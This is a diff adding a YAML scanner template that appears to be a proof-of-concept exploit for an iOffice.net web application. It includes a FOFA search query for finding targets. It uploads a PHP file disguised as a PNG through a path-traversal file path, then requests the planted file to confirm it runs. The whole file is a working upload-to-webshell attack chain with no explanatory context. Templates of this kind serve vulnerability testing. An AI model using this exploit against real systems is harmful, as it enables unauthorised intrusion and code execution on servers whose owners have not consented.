@@ -1,0 +1,54 @@
+info:
+  vulId:
+  detail:
+  fofaQuery: title="iOffice.net"
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/phpinfo.php"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Referer: "{{rootUrl}}"
+        Accept: application/json, text/javascript, */*; q=0.01
+      redirect: false
+      files:
+        name: file
+        filePath: /../shell/shell_test.php
+        fileName: test.png
+        contentType: application/octet-stream
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - ok
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/shell_test.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - PHP Extension
+          - PHP Version
+          - phpinfo
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
